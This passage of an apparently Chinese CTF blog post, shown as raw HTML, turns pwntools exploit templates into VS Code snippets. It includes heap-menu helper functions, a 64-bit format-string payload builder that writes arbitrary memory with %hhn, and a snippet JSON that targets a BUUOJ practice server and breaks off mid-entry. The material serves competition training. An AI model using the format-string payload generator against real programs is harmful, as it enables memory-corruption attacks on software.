class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;&quot;</span>, <span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure><h3 id="format-py"><a href="#format-py" class="headerlink" title="format.py"></a>format.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string_template_64</span>(<span class="params">location_arg,target,after_change,len_other_string = <span class="number">0</span>,ljust_location = <span class="number">0x50</span>,bit = <span class="number">0x6</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    第一个参数是格式化字符串的位置，即第几个参数</span></span><br><span class="line"><span class="string">    第二个参数是要改哪里的值</span></span><br><span class="line"><span class="string">    第三个参数是把想把目标值改成什么值</span></span><br><span class="line"><span class="string">    第四个参数是看看在printf之前还有没有奇奇怪怪的字符串</span></span><br><span class="line"><span class="string">    第五个参数是ljust填补核心payload之后，让其0x8个字节对齐，默认是0x50</span></span><br><span class="line"><span class="string">    第六个参数是要覆盖的位数，默认为6</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">1</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">2</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">3</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">4</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">        low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">        location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">5</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">        low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">        low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">        location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">        location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bit == <span class="number">6</span>:</span><br><span class="line">        low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">        low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">        low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">        low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">        low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">        low6 = (after_change &amp; <span class="number">0xff0000000000</span>) &gt;&gt; <span class="number">40</span></span><br><span class="line">    </span><br><span class="line">        c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">        c6 = (low6 - low5 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">    </span><br><span class="line">        location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">        location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">        location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">        location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">        location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">        location_arg6 = location_arg5 + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c6) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg6) + <span class="string">&#x27;hhn&#x27;</span></span><br><span class="line">        payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        payload = payload + p64(target)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line">        payload = payload + p64(target + <span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h2 id="将上述模板写入snippet"><a href="#将上述模板写入snippet" class="headerlink" title="将上述模板写入snippet"></a>将上述模板写入snippet</h2><p>采取了json库和文件操作来实现，整个settings.json来配置路径和prefix、body等信息<br>参照code的snippet说明和格式要求来完成<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>():</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    content = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;settings.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsdata = json.load(f)</span><br><span class="line"></span><br><span class="line">    jsonPath = jsdata[<span class="string">&quot;jsonPath&quot;</span>]</span><br><span class="line">    files = jsdata[<span class="string">&quot;filePath&quot;</span>]</span><br><span class="line">    names =  jsdata[<span class="string">&quot;snippetName&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(files[i], <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read().splitlines()</span><br><span class="line">        data[names[i]] = &#123;</span><br><span class="line">            <span class="string">&quot;prefix&quot;</span>: names[i], </span><br><span class="line">            <span class="string">&quot;body&quot;</span>: content</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(jsonPath, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        json.dump(data, f, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;OK!&quot;</span>)</span><br></pre></td></tr></table></figure></p><h3 id="Python-snippet"><a href="#Python-snippet" class="headerlink" title="Python.snippet"></a>Python.snippet</h3><p>运行python文件，得到的Python的snippet文件如下<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;pwn&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span>: <span class="string">&quot;pwn&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;body&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;from pwn import *&quot;</span>,</span><br><span class="line">            <span class="string">&quot;import sys&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;arch =  64&quot;</span>,</span><br><span class="line">            <span class="string">&quot;challenge = \&quot;$1\&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;libc_path = &#x27;$2&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def dbg():&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    context.log_level = &#x27;debug&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def echo(content):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    print(\&quot;\\033[4;36;40mOutput prompts:\\033[0m\&quot; + \&quot;\\t\\033[7;33;40m[*]\\033[0m \&quot; + \&quot;\\033[1;31;40m\&quot; + content + \&quot;\\033[0m\&quot;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def exp():&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    pass&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;local = int(sys.argv[1])&quot;</span>,</span><br><span class="line">            <span class="string">&quot;elf = ELF(challenge)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;libc = ELF(libc_path)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;context.os = &#x27;linux&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;if local:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    io = process(challenge,env = &#123;\&quot;LD_PRELOAD\&quot;:libc_path&#125;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;else:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    io = remote(\&quot;node4.buuoj.cn\&quot;, 25965)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;if arch == 64:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    context.arch = &#x27;amd64&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;elif arch == 32:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    context.arch = &#x27;i386&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;p   = lambda      : pause() &quot;</span>,</span><br><span class="line">            <span class="string">&quot;s   = lambda x    : success(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;re  = lambda m, t : io.recv(numb=m, timeout=t)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ru  = lambda x    : io.recvuntil(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rl  = lambda      : io.recvline()&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sd  = lambda x    : io.send(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sl  = lambda x    : io.sendline(x)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ia  = lambda      : io.interactive()&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sla = lambda a, b : io.sendlineafter(a, b)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sa  = lambda a, b : io.sendafter(a, b)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uu32 = lambda x   : u32(x.ljust(4,b&#x27;\\x00&#x27;))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uu64 = lambda x   : u64(x.ljust(8,b&#x27;\\x00&#x27;))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;bps = []&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pie = 0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def gdba():&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if local == 0:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        return 0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    cmd =&#x27;set follow-fork-mode parent\\n&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if pie:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        base = int(os.popen(\&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;\&quot;.format(io.pid)).readlines()[1],16)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        cmd +=&#x27;&#x27;.join([&#x27;b *&#123;:#x&#125;\\n&#x27;.format(b+base) for b in bps])&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        cmd +=&#x27;set $base=&#123;:#x&#125;\\n&#x27;.format(base)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    else:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        cmd+=&#x27;&#x27;.join([&#x27;b *&#123;:#x&#125;\\n&#x27;.format(b) for b in bps])&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    gdb.attach(io,cmd)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;exp()&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ia()&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;menu&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span>: <span class="string">&quot;menu&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;body&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;_add,_free,_edit,_show = 1,2,3,4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;menu = \&quot;$1\&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def add(size, content):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_add))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(size))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sa(\&quot;\&quot;, content)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def edit(idx, content):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_edit))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(idx))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sa(\&quot;\&quot;, content)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def free(idx):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_free))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(idx))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;def show(idx):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(menu, str(_show))&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    sla(\&quot;\&quot;, str(idx))&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;64format&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span>: <span class="string">&quot;64format&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;body&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;def format_string_template_64(location_arg,target,after_change,len_other_string = 0,ljust_location = 0x50,bit = 0x6):&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &#x27;&#x27;&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第一个参数是格式化字符串的位置，即第几个参数&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第二个参数是要改哪里的值&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第三个参数是把想把目标值改成什么值&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第四个参数是看看在printf之前还有没有奇奇怪怪的字符串&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第五个参数是ljust填补核心payload之后，让其0x8个字节对齐，默认是0x50&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    第六个参数是要覆盖的位数，默认为6&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    &#x27;&#x27;&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 1:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload.ljust(ljust_location,&#x27;a&#x27;)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + p64(target)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;    if bit == 2:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low1 = (after_change &amp; 0xff)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        low2 = (after_change &amp; 0xff00) &gt;&gt; 8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c1 = (low1 - len_other_string + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        c2 = (low2 - low1 + 0x100) % 0x100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg1 = location_arg + ljust_location / 0x8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        location_arg2 = location_arg1 + 1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = &#x27;%&#x27; + str(c1) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg1) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;        payload = payload + &#x27;%&#x27; + str(c2) + &#x27;c&#x27; + &#x27;%&#x27; + str(location_arg2) + &#x27;hhn&#x27;&quot;</span>,</span><br><span class="line">            